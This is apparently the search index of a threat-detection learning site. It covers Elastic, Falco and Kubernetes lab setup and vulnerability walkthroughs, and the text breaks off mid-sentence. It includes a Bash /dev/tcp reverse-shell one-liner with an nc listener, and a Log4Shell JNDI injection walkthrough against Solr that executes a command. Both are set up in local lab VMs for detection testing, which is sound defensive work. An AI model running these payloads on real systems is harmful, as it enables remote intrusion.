{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Welcome","text":"<p>A curated list of resources about detecting threats and defending applications as well as Linux and Kubernetes systems.</p>"},{"location":"basics/","title":"Basics","text":"<p>TBD</p>"},{"location":"bookshelf/","title":"Bookshelf","text":"<ul> <li>Steele T.; Patten C.; Kottmann D. (2020). Black Hat Go: Go Programming for Hackers and Pentesters. No Starch Press</li> <li>Seitz, J.; Arnold T. (2021). Black Hat Python: Python Programming for Hackers and Pentesters (2nd ed.). No Starch Press</li> <li>AlFardan, N. (2024). Cyber Threat Hunting. Manning Publications Co.</li> <li>Creane, B.; Gupta, A. (2022). Kubernetes Security and Observability: A Holistic Approach to Securing Containers and Cloud Native Applications. O'Reilly Media</li> <li>Degioanni, L.; Grasso, L. (2022). Practical Cloud Native Security with Falco: Risk and Threat Detection for Containers, Kubernetes, and Cloud. O'Reilly Media</li> <li>Roddie, M.; Deyalsingh, J.; Katz, G. J. (2023). Practical Threat Detection Engineering: A hands-on guide to planning, developing, and validating detection capabilities (Kindle Edition). Packt Publishing</li> </ul> OccupytheWeb. (20??). Getting Started Becoming a Master Hacker. ??? Chapter 12: Web Hacking Chapter 16: Malicious Python Grubb, S. (2021). How cybersecurity really works : a hands-on guide for total beginners. No Starch Press Chapter 7: Attacks in the cloud <ul> <li>Attacking the Cloud</li> <li>Defending the Cloud</li> <li>Exercise: Performing SQL Injection on the Damn Vulnerable Web Application<ul> <li>Installing Docker and the DVWA</li> <li>Listing Users</li> <li>Finding Database Table Names</li> <li>Finding Passwords</li> </ul> </li> </ul> Chapter 10: How to Defeat Black Hats <ul> <li>What's the Worst That Could Happen?<ul> <li>Risks</li> <li>Threats</li> </ul> </li> <li>Controls</li> <li>Risk Management Programs</li> <li>Putting It All Together</li> <li>Exercise: Conducting a Risk Analysis</li> <li>Farewell and Good Luck</li> </ul> OccupytheWeb. (2023). Network Basics for Hackers. InfoSec Press 12. HTTP <ul> <li>HTTP Protocol</li> <li>Status Codes</li> <li>HTTPS</li> <li>Hacking Web App Authentication with BurpSuite</li> </ul>"},{"location":"contributing/","title":"Contributing","text":"<pre><code>https://github.com/danielpacak/awesome-threat-detection.git\ncd awesome-threat-detection\n</code></pre> <p>Use standalone installer or choose any other installation method that works for you.</p> <pre><code>curl -LsSf https://astral.sh/uv/install.sh | sh\n</code></pre> <p>(Optional) Update uv to the latest version if it's already installed.</p> <pre><code>uv self update\n</code></pre> <pre><code>uv sync --frozen\n</code></pre> <pre><code>uv run mkdocs serve\n</code></pre> <p>Open http://localhost:8000/awesome-threat-detection/ in your web browser.</p>"},{"location":"java/","title":"Java","text":""},{"location":"java/#the-eclipse-jetty-project","title":"The Eclipse Jetty Project","text":"<p>Eclipse Jetty is a lightweight, highly scalable, Java-based web server and Servlet engine. Jetty's goal is to support web protocols (HTTP/1, HTTP/2, HTTP/3, WebSocket, etc.) in a high volume low latency way that provides maximum performance while retaining the ease of use and compatibility with years of Servlet development. Jetty is a modern fully asynchronous web server that has a long history as a component oriented technology, and can be easily embedded into applications while still offering a solid traditional distribution for webapp deployment.</p> <ul> <li>https://jetty.org/</li> <li>https://projects.eclipse.org/projects/rt.jetty</li> <li>https://github.com/jetty/jetty.project</li> </ul>"},{"location":"python/","title":"Python","text":""},{"location":"python/#using-web-libraries","title":"Using Web Libraries","text":""},{"location":"python/#the-urllib2-library-for-python-2x","title":"The urllib2 Library for Python 2.x","text":"<p>The urllib2 library is used in code written for Python 2.x. It's bundled into the standard library. People use the urllib2 library when creating tools to interact with web services.</p> <pre><code>import urllib2\nurl = 'https://danielpacak.github.io/awesome-threat-detection/'\nresponse = urllib2.urlopen(url) # GET\nprint(response.read())\nresponse.close()\n</code></pre> <p>The urllib2 library includes a Request class that gives you more fine-grained control over how you make HTTP requests, including being able to define specific headers, handle cookies, and create POST requests.</p> <pre><code>import urllib2\nurl = 'https://danielpacak.github.io/awesome-threat-detection/'\nheaders = {'User-Agent': 'Googlebot'}\n\nrequest  = urllib2.Request(url,headers=headers)\nresponse = urllib2.urlopen(request)\n\nprint(response.read())\nresponse.close()\n</code></pre>"},{"location":"python/#the-urllib-library-for-python-3x","title":"The urllib Library for Python 3.x","text":"<p>In Python 3.x, the standard library provides the <code>urllib</code> package, which splits the capabilities from the <code>urllib2</code> package into the <code>urllib.request</code> and <code>urllib.error</code> subpackages. It also adds URL-parsing capability with the subpackage <code>urllib.parse</code>.</p> <pre><code>import urllib.parse\nimport urllib.request\n\nurl = 'https://danielpacak.github.io/awesome-threat-detection/'\nwith urllib.request.urlopen(url) as response:  # GET\n    content = response.read()\n\nprint(content)\n</code></pre>"},{"location":"attacks/reverse-shell/","title":"Reverse Shell","text":"<p>In a reverse shell attack, threat actors identify a target system and cause them to send a remote connection request. The attacker's system acts as a listener and accepts the request, creating a remote shell to the victim's device.</p>"},{"location":"attacks/reverse-shell/#reverse-shell-example-using-lima-vms","title":"Reverse Shell Example Using Lima VMs","text":"<p>In Lima the user-v2 network provides a user-mode networking similar to the default user-mode network and also provides support for VM to VM communication. An instance's IP address is resolvable from another instance as <code>lima-&lt;NAME&gt;.internal.</code> (e.g., <code>lima-default.internal.</code>)</p> <pre><code>flowchart LR\n    attacker[\"LimaVM: reverse-shell-attacker (192.168.104.1:4444)\"]\n    victim[\"LimaVM: reverse-shell-victim (192.168.104.3)\"]\n    attacker &lt;-- commands --&gt; victim</code></pre> AttackerVictim <pre><code>limactl start --name=reverse-shell-attacker --disk=20 \\\n  --network=lima:user-v2 template:ubuntu\n</code></pre> <pre><code>limactl start --name=reverse-shell-victim --disk=20 \\\n  --network=lima:user-v2 template:ubuntu\n</code></pre> <p>Here is a code example of a Bash reverse shell that can be used to establish a command shell on a remote machine:</p> AttackerVictim <p>Start a listener on the attacker's machine.</p> <pre><code>nc -nlvp 4444\n</code></pre> <p>On the target machine, use Bash to establish a connection back to the listener.</p> <pre><code>bash -i &gt;&amp; /dev/tcp/192.168.104.1/4444 &lt;&amp;1\n</code></pre>"},{"location":"attacks/reverse-shell/#further-reading","title":"Further Reading","text":"<ul> <li>https://www.aquasec.com/cloud-native-academy/cloud-attacks/reverse-shell-attack/</li> </ul>"},{"location":"detection-engineering-test-labs/elastic-stack/","title":"Elastic Stack","text":""},{"location":"detection-engineering-test-labs/elastic-stack/#todo","title":"TODO","text":"<ol> <li>[ ] Upgrade to more recent version of Elastic Stack (8.4 is pretty with limited support)</li> <li>[ ] Test that Elastic Stack can detect Atlassian Confluence Pre-Auth RCE via OGNL Injection (CVE-2022-26134)</li> <li>[ ] Do I need two instances of Elasticsearch running as Docker Compose services?</li> </ol>"},{"location":"detection-engineering-test-labs/elastic-stack/#technical-requirements","title":"Technical requirements","text":"<p>TBD I'm not sure how to split the test lab in LimaVM, i.e. one or two VMs?</p>"},{"location":"detection-engineering-test-labs/elastic-stack/#the-elastic-stack","title":"The Elastic Stack","text":"<p>The Elastic Stack is a set of tightly integrated products that are well suited to address the requirements of a Detection Engineering lab. The Elastic Stack includes the following components:</p> <ul> <li>Beats: A data shipper that is used to collect data from an endpoint and forward   it to Elasticsearch or Logstash for preprocessing. Different packages exist for   collecting different types of data from endpoints. Talk about Elastic Agent...</li> <li>Logstash: A powerful tool for transforming data and forwarding it to different   destination systems. It offers a high degree of control over re-shaping data   and has plugins that support forwarding data to a significant variety of destinations.</li> <li>Elasticsearch: This is the data storage component. While primarily designed for searching,   it has evolved to become a capable data analysis engine.</li> <li>Kibana: This is the Elasticsearch frontend. Kibana allows users to explore and visualize data stored in   Elasticsearch using a web browser. To read more about Kibana's vast feature set, visit Elastic's website:   https://www.elastic.co/kibana/features.</li> <li>Integrations: This refers to the large collection of data ingestion components   that are enabled by Elastic Agent and managed by Fleet Server. Once an endpoint has   Elastic Agent installed on it, administrators can configure the collection of data from   a variety of known data sources. Elastic Agent receives configuration details from   Fleet Server about what data should be collected, and which server the data should be output to.   These configuration details are defined as agent policies and are stored in Elasticsearch.</li> </ul> <pre><code>flowchart TD\n    subgraph limaVM[\"Ubuntu in LimaVM 192.168.5.15/24\"]\n        subgraph docker[\"Docker 172.17.0.1/16\"]\n            kibana(\"Kibana 172.18.0.5/16\")\n            elasticsearch1(\"Elasticsearch (es01) 172.18.0.3/16\")\n            elasticsearch2(\"Elasticsearch (es02) 172.18.0.4/16\")\n            fleetServer(\"Fleet server\")\n            kibana --&gt; elasticsearch1\n            fleetServer --&gt; elasticsearch1\n        end\n        elasticAgent(\"Elastic agent\")\n    end\n\n    elasticAgent &lt;-- \"policy data and heartbeat\" --&gt; fleetServer\n    elasticAgent --&gt; elasticsearch1</code></pre> <p>https://www.elastic.co/docs/deploy-manage/deploy/self-managed/install-elasticsearch-with-docker https://www.elastic.co/docs/deploy-manage/deploy/self-managed/install-elasticsearch-docker-compose</p> <p>Due to the increased memory requirements of Elastic, the default Docker settings must be modified to handle this. If you installed Docker on a Linux-based system, as outlined in the Elastic system configuration documentation at https://www.elastic.co/guide/en/elasticsearch/reference/8.4/vm-max-map-count.html, then you need to modify the vm.max_map_count setting of the Docker hosts via the sysctl command.</p> <p>On Linux, this can be achieved by issuing the following command:</p> <pre><code>sudo sysctl -w vm.max_map_count=262144\n</code></pre> <p>You can make this change survive reboots by modifying /etc/sysctl.conf.</p> <p>Using a new terminal, change your working directory to the esk subdirectory of the project root folder and issue the <code>docker compose up -d</code> command.</p> <p>If everything has gone well, you will be able to access your Elastic Stack by going to http://[ip address of your docker host]:5601, or http://localhost:5601 if you are running Docker on the same machine.</p> <p>You can log in by using elastic as the username and the password specified in the .env file for the ELASTIC_PASSWORD value.</p> <p>Click the hamburger menu in the top-left corner of the page. Under the Management section, click Fleet. After navigating there, you will be presented with the screen, which walks you through setting up Fleet Server. For the Fleet Server host field, use https://[ip address of your docker host]:8220</p> <p>Select Generate Fleet Server policy. A sequence of commands for installing Fleet on a centralized how will be provided.</p> <p>https://192.168.5.15:8220 or https://172.17.0.1:8220</p> <p>Linux Tar <pre><code>curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.4.3-linux-x86_64.tar.gz\ntar xzvf elastic-agent-8.4.3-linux-x86_64.tar.gz\ncd elastic-agent-8.4.3-linux-x86_64\nsudo ./elastic-agent install \\\n  --fleet-server-es=http://localhost:9200 \\\n  --fleet-server-service-token=AAEAAWVsYXN0aWMvZmxlZXQtc2VydmVyL3Rva2VuLTE3NjI4NTkyNTU5MDM6Q2Y5SW5XZFBSdkNfUElURUZlU05FQQ \\\n  --fleet-server-policy=fleet-server-policy\n</code></pre></p> <p>DEB <pre><code>curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.4.3-amd64.deb\nsudo dpkg -i elastic-agent-8.4.3-amd64.deb\nsudo elastic-agent enroll \\\n  --fleet-server-es=http://localhost:9200 \\\n  --fleet-server-service-token=AAEAAWVsYXN0aWMvZmxlZXQtc2VydmVyL3Rva2VuLTE3NjI4NTkyNTU5MDM6Q2Y5SW5XZFBSdkNfUElURUZlU05FQQ \\\n  --fleet-server-policy=fleet-server-policy\nsudo systemctl enable elastic-agent\nsudo systemctl start elastic-agent\n</code></pre></p> <p>We only need the value of fleet-server-service-token. Copy this value from the web page and paste it into the .env file in the fleet subdirectory.</p> <p>You can now start the Fleet container using the docker compose up -d</p> <p>With that, Fleet has been configured. Next, we'll perform some additional configurations that are required for full functionality.</p> <p>By default, the Fleet Server policy is configured to send output to the Elastic host (http://localhost:9200). Hosts that we later connect to our Fleet Server may not be able to reach the Elasticsearch backend using that address. Therefore, we need to change the default output so that telemetry from additional hosts gets stored in Elasticsearch.</p> <p>https://192.168.5.15:9200 or https://172.17.0.1:9200</p> <p>For Advanced YAML configuration, enter <code>ssl.verification_mode: none</code>.</p> <p>Install Elastic Agent (for Windows) Install Elastic Agent (for Linux)</p> <p>Linux TAR <pre><code>curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.4.3-linux-x86_64.tar.gz\ntar xzvf elastic-agent-8.4.3-linux-x86_64.tar.gz\ncd elastic-agent-8.4.3-linux-x86_64\nsudo ./elastic-agent install --url=https://192.168.5.15:8220 --insecure --enrollment-token=QzZ6TGNwb0JhZ3EzTXJVNkNZTFo6SjhWWW41T2JRamFZdTd6Q3JiV1lEdw==\n</code></pre> <pre><code>Elastic Agent will be installed at /opt/Elastic/Agent and will run as a service. Do you want to continue? [Y/n]:Y\n{\"log.level\":\"warn\",\"@timestamp\":\"2025-11-11T13:08:43.130+0100\",\"log.logger\":\"tls\",\"log.origin\":{\"file.name\":\"tlscommon/tls_config.go\",\"file.line\":104},\"message\":\"SSL/TLS verifications disabled.\",\"ecs.version\":\"1.6.0\"}\n{\"log.level\":\"info\",\"@timestamp\":\"2025-11-11T13:08:43.391+0100\",\"log.origin\":{\"file.name\":\"cmd/enroll_cmd.go\",\"file.line\":471},\"message\":\"Starting enrollment to URL: https://192.168.5.15:8220/\",\"ecs.version\":\"1.6.0\"}\n{\"log.level\":\"warn\",\"@timestamp\":\"2025-11-11T13:08:43.503+0100\",\"log.logger\":\"tls\",\"log.origin\":{\"file.name\":\"tlscommon/tls_config.go\",\"file.line\":104},\"message\":\"SSL/TLS verifications disabled.\",\"ecs.version\":\"1.6.0\"}\n{\"log.level\":\"info\",\"@timestamp\":\"2025-11-11T13:08:44.223+0100\",\"log.origin\":{\"file.name\":\"cmd/enroll_cmd.go\",\"file.line\":273},\"message\":\"Successfully triggered restart on running Elastic Agent.\",\"ecs.version\":\"1.6.0\"}\nSuccessfully enrolled the Elastic Agent.\nElastic Agent has been successfully installed.\n</code></pre></p> <pre><code>$ systemctl status elastic-agent.service\n\u25cf elastic-agent.service - Elastic Agent is a unified agent to observe, monitor and protect your system.\n     Loaded: loaded (/etc/systemd/system/elastic-agent.service; enabled; vendor preset: enabled)\n     Active: active (running) since Tue 2025-11-11 13:08:43 CET; 31s ago\n   Main PID: 96302 (elastic-agent)\n      Tasks: 56 (limit: 9475)\n     Memory: 810.8M\n        CPU: 15.237s\n     CGroup: /system.slice/elastic-agent.service\n             \u251c\u250096302 elastic-agent\n             \u251c\u250096415 /opt/Elastic/Agent/data/elastic-agent-90167b/install/filebeat-8.4.3-linux-x86_64/filebeat -E setup.ilm.enabled=false -E setup.template.enabled=false -E management.enabled=true -E log&gt;\n             \u251c\u250096469 /opt/Elastic/Agent/data/elastic-agent-90167b/install/metricbeat-8.4.3-linux-x86_64/metricbeat -E setup.ilm.enabled=false -E setup.template.enabled=false -E management.enabled=true -E&gt;\n             \u251c\u250096501 /opt/Elastic/Agent/data/elastic-agent-90167b/install/filebeat-8.4.3-linux-x86_64/filebeat -E setup.ilm.enabled=false -E setup.template.enabled=false -E management.enabled=true -E log&gt;\n             \u2514\u250096543 /opt/Elastic/Agent/data/elastic-agent-90167b/install/metricbeat-8.4.3-linux-x86_64/metricbeat -E setup.ilm.enabled=false -E setup.template.enabled=false -E management.enabled=true -E&gt;\n</code></pre> <p>DEB <pre><code>curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.4.3-amd64.deb\nsudo dpkg -i elastic-agent-8.4.3-amd64.deb\nsudo elastic-agent enroll --url=https://192.168.5.15:8220 --enrollment-token=QzZ6TGNwb0JhZ3EzTXJVNkNZTFo6SjhWWW41T2JRamFZdTd6Q3JiV1lEdw== \nsudo systemctl enable elastic-agent \nsudo systemctl start elastic-agent\n</code></pre></p> <p>Kubernetes <pre><code>---\n# For more information refer to https://www.elastic.co/guide/en/fleet/current/running-on-kubernetes-managed-by-fleet.html\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: elastic-agent\n  namespace: kube-system\n  labels:\n    app: elastic-agent\nspec:\n  selector:\n    matchLabels:\n      app: elastic-agent\n  template:\n    metadata:\n      labels:\n        app: elastic-agent\n    spec:\n      # Tolerations are needed to run Elastic Agent on Kubernetes master nodes.\n      # Agents running on master nodes collect metrics from the control plane components (scheduler, controller manager) of Kubernetes\n      tolerations:\n        - key: node-role.kubernetes.io/master\n          effect: NoSchedule\n      serviceAccountName: elastic-agent\n      hostNetwork: true\n      # 'hostPID: true' enables the Elastic Security integration to observe all process exec events on the host.\n      # Sharing the host process ID namespace gives visibility of all processes running on the same host.\n      hostPID: true\n      dnsPolicy: ClusterFirstWithHostNet\n      containers:\n        - name: elastic-agent\n          image: docker.elastic.co/beats/elastic-agent:8.4.3\n          env:\n            # Set to 1 for enrollment into Fleet server. If not set, Elastic Agent is run in standalone mode\n            - name: FLEET_ENROLL\n              value: \"1\"\n            # Set to true to communicate with Fleet with either insecure HTTP or unverified HTTPS\n            - name: FLEET_INSECURE\n              value: \"true\"\n            # Fleet Server URL to enroll the Elastic Agent into\n            # FLEET_URL can be found in Kibana, go to Management &gt; Fleet &gt; Settings\n            - name: FLEET_URL\n              value: \"https://192.168.5.15:8220\"\n            # Elasticsearch API key used to enroll Elastic Agents in Fleet (https://www.elastic.co/guide/en/fleet/current/fleet-enrollment-tokens.html#fleet-enrollment-tokens)\n            # If FLEET_ENROLLMENT_TOKEN is empty then KIBANA_HOST, KIBANA_FLEET_USERNAME, KIBANA_FLEET_PASSWORD are needed\n            - name: FLEET_ENROLLMENT_TOKEN\n              value: \"QzZ6TGNwb0JhZ3EzTXJVNkNZTFo6SjhWWW41T2JRamFZdTd6Q3JiV1lEdw==\"\n            - name: KIBANA_HOST\n              value: \"http://kibana:5601\"\n            # The basic authentication username used to connect to Kibana and retrieve a service_token to enable Fleet\n            - name: KIBANA_FLEET_USERNAME\n              value: \"elastic\"\n            # The basic authentication password used to connect to Kibana and retrieve a service_token to enable Fleet\n            - name: KIBANA_FLEET_PASSWORD\n              value: \"changeme\"\n            - name: NODE_NAME\n              valueFrom:\n                fieldRef:\n                  fieldPath: spec.nodeName\n            - name: POD_NAME\n              valueFrom:\n                fieldRef:\n                  fieldPath: metadata.name\n          securityContext:\n            runAsUser: 0\n          resources:\n            limits:\n              memory: 500Mi\n            requests:\n              cpu: 100m\n              memory: 200Mi\n          volumeMounts:\n            - name: proc\n              mountPath: /hostfs/proc\n              readOnly: true\n            - name: etc-kubernetes\n              mountPath: /hostfs/etc/kubernetes\n              readOnly: true\n            - name: var-lib\n              mountPath: /hostfs/var/lib\n              readOnly: true\n            - name: cgroup\n              mountPath: /hostfs/sys/fs/cgroup\n              readOnly: true\n            - name: varlibdockercontainers\n              mountPath: /var/lib/docker/containers\n              readOnly: true\n            - name: varlog\n              mountPath: /var/log\n              readOnly: true\n            - name: passwd\n              mountPath: /hostfs/etc/passwd\n              readOnly: true\n            - name: group\n              mountPath: /hostfs/etc/group\n              readOnly: true\n            - name: etcsysmd\n              mountPath: /hostfs/etc/systemd\n              readOnly: true\n            - name: etc-mid\n              mountPath: /etc/machine-id\n              readOnly: true\n      volumes:\n        - name: proc\n          hostPath:\n            path: /proc\n        - name: cgroup\n          hostPath:\n            path: /sys/fs/cgroup\n        - name: varlibdockercontainers\n          hostPath:\n            path: /var/lib/docker/containers\n        - name: varlog\n          hostPath:\n            path: /var/log\n        # Needed for cloudbeat\n        - name: etc-kubernetes\n          hostPath:\n            path: /etc/kubernetes\n        # Needed for cloudbeat\n        - name: var-lib\n          hostPath:\n            path: /var/lib\n        # Needed for cloudbeat\n        - name: passwd\n          hostPath:\n            path: /etc/passwd\n        # Needed for cloudbeat\n        - name: group\n          hostPath:\n            path: /etc/group\n        # Needed for cloudbeat\n        - name: etcsysmd\n          hostPath:\n            path: /etc/systemd\n        # Mount /etc/machine-id from the host to determine host ID\n        # Needed for Elastic Security integration\n        - name: etc-mid\n          hostPath:\n            path: /etc/machine-id\n            type: File\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: elastic-agent\nsubjects:\n  - kind: ServiceAccount\n    name: elastic-agent\n    namespace: kube-system\nroleRef:\n  kind: ClusterRole\n  name: elastic-agent\n  apiGroup: rbac.authorization.k8s.io\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  namespace: kube-system\n  name: elastic-agent\nsubjects:\n  - kind: ServiceAccount\n    name: elastic-agent\n    namespace: kube-system\nroleRef:\n  kind: Role\n  name: elastic-agent\n  apiGroup: rbac.authorization.k8s.io\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: elastic-agent-kubeadm-config\n  namespace: kube-system\nsubjects:\n  - kind: ServiceAccount\n    name: elastic-agent\n    namespace: kube-system\nroleRef:\n  kind: Role\n  name: elastic-agent-kubeadm-config\n  apiGroup: rbac.authorization.k8s.io\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: elastic-agent\n  labels:\n    k8s-app: elastic-agent\nrules:\n  - apiGroups: [\"\"]\n    resources:\n      - nodes\n      - namespaces\n      - events\n      - pods\n      - services\n      - configmaps\n      # Needed for cloudbeat\n      - serviceaccounts\n      - persistentvolumes\n      - persistentvolumeclaims\n    verbs: [\"get\", \"list\", \"watch\"]\n  # Enable this rule only if planing to use kubernetes_secrets provider\n  #- apiGroups: [\"\"]\n  #  resources:\n  #  - secrets\n  #  verbs: [\"get\"]\n  - apiGroups: [\"extensions\"]\n    resources:\n      - replicasets\n    verbs: [\"get\", \"list\", \"watch\"]\n  - apiGroups: [\"apps\"]\n    resources:\n      - statefulsets\n      - deployments\n      - replicasets\n      - daemonsets\n    verbs: [\"get\", \"list\", \"watch\"]\n  - apiGroups:\n      - \"\"\n    resources:\n      - nodes/stats\n    verbs:\n      - get\n  - apiGroups: [ \"batch\" ]\n    resources:\n      - jobs\n      - cronjobs\n    verbs: [ \"get\", \"list\", \"watch\" ]\n  # Needed for apiserver\n  - nonResourceURLs:\n      - \"/metrics\"\n    verbs:\n      - get\n  # Needed for cloudbeat\n  - apiGroups: [\"rbac.authorization.k8s.io\"]\n    resources:\n      - clusterrolebindings\n      - clusterroles\n      - rolebindings\n      - roles\n    verbs: [\"get\", \"list\", \"watch\"]\n  # Needed for cloudbeat\n  - apiGroups: [\"policy\"]\n    resources:\n      - podsecuritypolicies\n    verbs: [\"get\", \"list\", \"watch\"]\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: elastic-agent\n  # Should be the namespace where elastic-agent is running\n  namespace: kube-system\n  labels:\n    k8s-app: elastic-agent\nrules:\n  - apiGroups:\n      - coordination.k8s.io\n    resources:\n      - leases\n    verbs: [\"get\", \"create\", \"update\"]\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: elastic-agent-kubeadm-config\n  namespace: kube-system\n  labels:\n    k8s-app: elastic-agent\nrules:\n  - apiGroups: [\"\"]\n    resources:\n      - configmaps\n    resourceNames:\n      - kubeadm-config\n    verbs: [\"get\"]\n---\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: elastic-agent\n  namespace: kube-system\n  labels:\n    k8s-app: elastic-agent\n---\n</code></pre></p> <p>Your newly enrolled host will appear in the list of agents. Elastic Agent can be installed on many different operating systems, and this installation process can be repeated for any additional host you want to enroll in the Elastic Stack.</p> <p>https://www.elastic.co/docs/solutions/observability/infra-and-hosts/tutorial-observe-kubernetes-deployments</p>"},{"location":"detection-engineering-test-labs/elastic-stack/#further-reading","title":"Further reading","text":"<ul> <li>https://matheuzsecurity.github.io/hacking/bypassing-elastic/</li> </ul>"},{"location":"detection-engineering-test-labs/falco/","title":"Falco","text":"<p>The Falco Project officially supports three ways to run Falco in production:</p> <ul> <li>Running Falco directly on a host</li> <li>Running Falco in a container</li> <li>Deploying Falco to a Kubernetes cluster</li> </ul> <p>TBD</p> <p>Setup Falco with Falcosidekick and Elasticsearch to test that it can be used for threat hunting. Show also how we can bypass Falco rules.</p> <p>https://github.com/falcosecurity/falcosidekick-ui https://falco.org/docs/getting-started/falco-kubernetes-quickstart/</p> <pre><code>helm repo add falcosecurity https://falcosecurity.github.io/charts\nhelm repo update\n</code></pre> <pre><code>helm install --replace falco \\\n             --namespace falco \\\n             --create-namespace \\\n             --set falcosidekick.enabled=true \\\n             --set falcosidekick.webui.enabled=true \\\n              falcosecurity/falco\n</code></pre> <pre><code>docker run --rm -it \\\n           --name falco \\\n           --privileged \\\n           -v /sys/kernel/tracing:/sys/kernel/tracing:ro \\\n           -v /var/run/docker.sock:/host/var/run/docker.sock \\\n           -v /proc:/host/proc:ro \\\n           -v /etc:/host/etc:ro \\\n           falcosecurity/falco:0.42.0\n</code></pre>"},{"location":"detection-engineering-test-labs/jibril/","title":"Jibril","text":"<p>https://jibril.garnet.ai/</p>"},{"location":"detection-engineering-test-labs/spyderbat/","title":"Spyderbat","text":""},{"location":"vulnerabilities/cve-2021-44228/","title":"Apache Log4j2 Lookup Feature JNDI Injection (CVE-2021-44228)","text":""},{"location":"vulnerabilities/cve-2021-44228/#overview","title":"Overview","text":"<pre><code>flowchart TD\n  javachains[\"Pod: Java Chains 10.244.0.82:8011 10.244.0.82:50389\"]\n  solr[\"Pod: Apache Solr v8.11.0 10.244.0.80:8983\"]\n  curl[\"curl\"]\n\n  solr -- \"LDAP (Download Payload)\" --&gt; javachains\n  curl -- \"curl -v 'http://localhost:8983/solr/admin/cores?action=${jndi:ldap://10.244.0.82:50389/b37308}'\" --&gt; solr</code></pre>"},{"location":"vulnerabilities/cve-2021-44228/#wip-create-and-start-lima-vm","title":"[WIP] Create and Start Lima VM","text":"<p>TODO</p>"},{"location":"vulnerabilities/cve-2021-44228/#deploy-apache-solr","title":"Deploy Apache Solr","text":"<p>Deploy Apache Solr 8.11.0 as a Kubernetes pod:</p> <pre><code>k apply -f code/vulnerabilities/cve-2021-44228/all.yaml\n</code></pre> <p>Start listening on port <code>8983</code> locally, forwarding data to/from port <code>8983</code> in the <code>solr</code> pod.</p> <pre><code>k port-forward -n solr pods/solr 8983:8983\n</code></pre> <p>Navigate to Java Chains Web UI at http://localhost:8983.</p>"},{"location":"vulnerabilities/cve-2021-44228/#deploy-java-chains","title":"Deploy Java Chains","text":"<p>Deploy Java Chains as a Kubernetes pod:</p> <pre><code>k apply -f code/javachains/javachains.kubernetes.yaml\n</code></pre> <p>If everything goes well, start listening on port 8011 locally, forwarding data to/from port 8011 in the <code>javachains</code> pod.</p> <pre><code>k port-forward -n javachains pod/javachains 8011:8011\n</code></pre> <p>Navigate to Java Chains Web UI at http://localhost:8011 and log in as <code>admin:admin</code>.</p> <p>Go to JNDI / JNDI Control page, set the IP Address (Reverse IP) to 10.244.0.82 and click the Start button to launch the embedded JNDI server. The LDAP URL should be <code>ldap://10.244.0.82:50389/x</code>.</p> <p></p>"},{"location":"vulnerabilities/cve-2021-44228/#create-jndibasicpayload-to-execute-commands","title":"Create JNDIBasicPayload to Execute Commands","text":""},{"location":"vulnerabilities/cve-2021-44228/#write-to-the-tmp-directory","title":"Write to the /tmp Directory","text":"<p>Go to JNDI / JNDIBasicPayload page and generate payload to execute the <code>touch /tmp/passwd</code> command.</p> <p></p> <p>Copy the payload <code>ldap://10.244.0.82:50389/d4db3d</code> and use it in the following curl command:</p> <pre><code>curl -v 'http://localhost:8983/solr/admin/cores?action=${jndi:ldap://10.244.0.82:50389/d4db3d}'\n</code></pre> <p>Alternatively, open http://localhost:8983/solr/admin/cores?action=${jndi:ldap://10.244.0.82:50389/d4db3d} in a web browser.</p>"},{"location":"vulnerabilities/cve-2021-44228/#wip-open-a-web-shell","title":"[WIP] Open a Web Shell","text":"<p>TODO</p>"},{"location":"vulnerabilities/cve-2021-44228/#use-inspektor-gadget-to-verify-that-the-payload-was-executed","title":"Use Inspektor Gadget to Verify that the Payload was Executed","text":"<pre><code>k gadget run ghcr.io/inspektor-gadget/gadget/trace_exec:latest \\\n  --namespace solr \\\n  --output columns \\\n  --fields timestamp,proc.pid,proc.parent.pid,proc.comm,args,k8s.podName,k8s.namespace\n</code></pre>"},{"location":"vulnerabilities/cve-2021-44228/#cleanup","title":"Cleanup","text":"<pre><code>k delete -f code/vulnerabilities/cve-2021-44228/all.yaml\n</code></pre> <pre><code>k delete -f code/javachains/javachains.kubernetes.yaml\n</code></pre>"},{"location":"vulnerabilities/cve-2021-44228/#further-reading","title":"Further Reading","text":"<ul> <li>https://nvd.nist.gov/vuln/detail/cve-2021-44228/</li> <li>https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228/</li> <li>https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/</li> <li>https://java-chains.vulhub.org/docs/module/jndi#jndibasicpayload</li> <li>https://github.com/apache/solr</li> <li>https://github.com/christophetd/log4shell-vulnerable-app</li> </ul>"},{"location":"vulnerabilities/cve-2022-26134/","title":"Atlassian Confluence Pre-Auth RCE via OGNL Injection (CVE-2022-26134)","text":"<p>TBD</p>"},{"location":"vulnerabilities/cve-2023-43208/","title":"NextGen Mirth Connect Pre-Auth RCE (CVE-2023-43208)","text":""},{"location":"vulnerabilities/dvwa/","title":"Damn Vulnerable Web Application (DVWA)","text":""},{"location":"vulnerabilities/dvwa/#overview","title":"Overview","text":"<p>Damn Vulnerable Web Application (DVWA) is a PHP/MariaDB web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students and teachers to learn about web application security in a controlled class room environment.</p> <pre><code>k apply -f code/dvwa/dvwa.kubernetes.yaml\n</code></pre> <pre><code>k port-forward -n dvwa svc/dvwa-app 8888:8888\n</code></pre> <p>Navigate to http://localhost:8888 and login as 